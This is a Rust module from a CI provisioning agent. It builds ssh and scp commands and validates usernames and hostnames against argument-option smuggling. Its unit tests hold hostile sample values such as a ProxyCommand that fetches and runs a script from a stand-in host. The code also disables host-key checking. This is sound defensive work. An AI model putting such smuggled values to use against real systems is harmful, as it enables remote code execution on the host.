//! Shared SSH primitives used by the meda + lume provisioning paths.
//! Builds the right `ssh`/`scp` invocation for key-based or password-based auth.
//!
//! Hardening: `SshTarget::new` validates `user` and `host` against a strict
//! identifier regex so payload-controlled values (e.g. `login.username` from
//! the cirun api) cannot be smuggled past argv parsing. OpenSSH treats any
//! argv element starting with `-` as an option regardless of an embedded `@`,
//! so a username like `-oProxyCommand=…` would otherwise yield RCE on the
//! agent host. Validation + a literal `--` argv separator before the
//! destination is defence-in-depth: either alone is sufficient, both together
//! make the failure mode obvious to anyone touching this file.

use anyhow::{anyhow, Result};
use log::info;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;

// Each variant is exclusively used by a single per-OS executor path:
// `Key` by meda (linux), `PasswordFile` by lume (macos). On either host
// the unused variant is dead — that's by design, not a bug — so the
// allow keeps `-D warnings` happy on both targets without breaking the
// pattern-match exhaustiveness of the rest of the module.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub enum SshAuth {
    /// `ssh -i <path>` — used by meda (cloud-init seeds an ed25519 key).
    Key(PathBuf),
    /// `sshpass -f <path>` — used by lume (cloned macOS VM authenticates with the template user's password).
    PasswordFile(PathBuf),
}

pub struct SshTarget {
    host: String,
    user: String,
    auth: SshAuth,
}

/// Accept identifiers a sane Unix username or hostname/IP could plausibly use.
/// Rejects anything starting with `-` (option smuggling) plus shell metachars,
/// quotes, whitespace, and the path separator. IPv4/IPv6/hostnames all fit
/// inside `[A-Za-z0-9._:-]`; usernames inside `[A-Za-z0-9._-]`. Cap length at
/// 253 (DNS label limit) to bound any worst-case argv ballooning.
fn is_safe_ssh_identifier(s: &str) -> bool {
    if s.is_empty() || s.len() > 253 {
        return false;
    }
    if s.starts_with('-') {
        return false;
    }
    s.bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'_' || b == b'-' || b == b':')
}

#[derive(Debug, thiserror::Error)]
pub enum SshError {
    #[error("invalid ssh user '{0}' — must match [A-Za-z0-9._-]{{1,253}} and not start with '-'")]
    InvalidUser(String),
    #[error("invalid ssh host '{0}' — must match [A-Za-z0-9.:_-]{{1,253}} and not start with '-'")]
    InvalidHost(String),
}

impl SshTarget {
    /// Validate then construct. Rejects host/user values that could be
    /// mistaken for ssh options (the option-smuggling RCE). All callers MUST
    /// use this — `host`/`user` are private to prevent struct-literal bypass.
    pub fn new(host: String, user: String, auth: SshAuth) -> Result<Self, SshError> {
        if !is_safe_ssh_identifier(&user) {
            return Err(SshError::InvalidUser(user));
        }
        if !is_safe_ssh_identifier(&host) {
            return Err(SshError::InvalidHost(host));
        }
        Ok(Self { host, user, auth })
    }

    fn ssh_options() -> Vec<&'static str> {
        vec![
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "ConnectTimeout=10",
        ]
    }

    /// Extra ssh options for the password-auth flow. Without
    /// `PreferredAuthentications=password` + `PubkeyAuthentication=no`,
    /// ssh tries every key in `~/.ssh/` first, then falls back to
    /// keyboard-interactive — and `sshpass -f` only intercepts the
    /// `password` prompt, not keyboard-interactive. The result on macOS
    /// hosts is a silent ssh exit (just "Permanently added <ip>" stderr,
    /// no auth error), which the agent surfaces as "SSH exec failed".
    /// Forcing the auth method straight to `password` lets sshpass do its
    /// job and gives a real error if it still fails.
    fn ssh_password_options() -> Vec<&'static str> {
        vec![
            "-o",
            "PreferredAuthentications=password",
            "-o",
            "PubkeyAuthentication=no",
        ]
    }

    fn destination(&self) -> String {
        format!("{}@{}", self.user, self.host)
    }

    /// Build an `ssh user@host <remote_cmd>` Command, configured for the auth mode.
    /// The literal `--` argv separator before the destination guarantees ssh
    /// stops parsing options before our user-controlled value (defence in
    /// depth — `SshTarget::new` already validates these).
    fn ssh_cmd(&self, remote_cmd: &str) -> Command {
        match &self.auth {
            SshAuth::Key(key_path) => {
                let mut c = Command::new("ssh");
                c.arg("-i")
                    .arg(key_path)
                    .args(Self::ssh_options())
                    .arg("--")
                    .arg(self.destination())
                    .arg(remote_cmd)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                c
            }
            SshAuth::PasswordFile(pw_path) => {
                let mut c = Command::new("sshpass");
                c.arg("-f")
                    .arg(pw_path)
                    .arg("ssh")
                    .args(Self::ssh_options())
                    .args(Self::ssh_password_options())
                    .arg("--")
                    .arg(self.destination())
                    .arg(remote_cmd)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                c
            }
        }
    }

    /// Build an `scp <local> user@host:<remote>` Command. `--` separator same
    /// reason as `ssh_cmd`.
    fn scp_cmd(&self, local: &Path, remote: &str) -> Command {
        let remote_arg = format!("{}:{}", self.destination(), remote);
        match &self.auth {
            SshAuth::Key(key_path) => {
                let mut c = Command::new("scp");
                c.arg("-i")
                    .arg(key_path)
                    .args(Self::ssh_options())
                    .arg("--")
                    .arg(local)
                    .arg(remote_arg)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                c
            }
            SshAuth::PasswordFile(pw_path) => {
                let mut c = Command::new("sshpass");
                c.arg("-f")
                    .arg(pw_path)
                    .arg("scp")
                    .args(Self::ssh_options())
                    .args(Self::ssh_password_options())
                    .arg("--")
                    .arg(local)
                    .arg(remote_arg)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                c
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn safe_identifier_accepts_normal_usernames_and_hosts() {
        for s in [
            "runner",
            "ubuntu",
            "cirun-runner",
            "10.0.0.1",
            "host.example.com",
            "::1",
        ] {
            assert!(is_safe_ssh_identifier(s), "rejected legitimate value: {s}");
        }
    }

    #[test]
    fn safe_identifier_rejects_option_smuggling() {
        for s in ["-oProxyCommand=curl evil.sh|sh", "-i/tmp/evil", "-", "--"] {
            assert!(!is_safe_ssh_identifier(s), "leading-dash accepted: {s}");
        }
    }

    #[test]
    fn safe_identifier_rejects_shell_metachars_and_whitespace() {
        for s in ["a b", "a;b", "a|b", "a$b", "a`b`", "a\nb", "a/b", "a\"b"] {
            assert!(!is_safe_ssh_identifier(s), "metachar accepted: {s:?}");
        }
    }

    #[test]
    fn safe_identifier_rejects_empty_and_overlong() {
        assert!(!is_safe_ssh_identifier(""));
        assert!(!is_safe_ssh_identifier(&"a".repeat(254)));
    }

    #[test]
    fn ssh_target_new_rejects_option_smuggling_user() {
        let r = SshTarget::new(
            "10.0.0.1".into(),
            "-oProxyCommand=curl evil|sh".into(),
            SshAuth::Key(PathBuf::from("/tmp/k")),
        );
        assert!(matches!(r, Err(SshError::InvalidUser(_))));
    }

    #[test]
    fn ssh_target_new_rejects_option_smuggling_host() {
        let r = SshTarget::new(
            "-oProxyCommand=evil".into(),
            "runner".into(),
            SshAuth::Key(PathBuf::from("/tmp/k")),
        );
        assert!(matches!(r, Err(SshError::InvalidHost(_))));
    }

    #[test]
    fn ssh_target_new_accepts_valid() {
        let r = SshTarget::new(
            "10.0.0.1".into(),
            "runner".into(),
            SshAuth::Key(PathBuf::from("/tmp/k")),
        );
        assert!(r.is_ok());
    }
}

/// Run a remote command via SSH with a hard timeout. Captures stdout/stderr.
pub async fn exec(target: &SshTarget, remote_cmd: &str, timeout: Duration) -> Result<String> {
    let output = tokio::time::timeout(timeout, target.ssh_cmd(remote_cmd).output())
        .await
        .map_err(|_| anyhow!("SSH exec timed out after {:?}", timeout))?
        .map_err(|e| anyhow!("SSH spawn error: {}", e))?;
    if !output.status.success() {
        return Err(anyhow!(
            "SSH exec failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// Cheap connectivity probe: runs `echo` over SSH. Returns Ok if the connection works.
pub async fn test_connection(target: &SshTarget) -> Result<()> {
    exec(target, "echo SSH-OK", Duration::from_secs(30)).await?;
    Ok(())
}

/// Copy a local file to the remote via SCP.
pub async fn copy_file(target: &SshTarget, local: &Path, remote: &str) -> Result<()> {
    let output = tokio::time::timeout(
        Duration::from_secs(60),
        target.scp_cmd(local, remote).output(),
    )
    .await
    .map_err(|_| anyhow!("SCP transfer timed out after 60s"))?
    .map_err(|e| anyhow!("SCP spawn error: {}", e))?;
    if !output.status.success() {
        return Err(anyhow!(
            "SCP failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }
    info!(
        "✔ SCP transferred {:?} -> {}:{}",
        local,
        target.destination(),
        remote
    );
    Ok(())
}
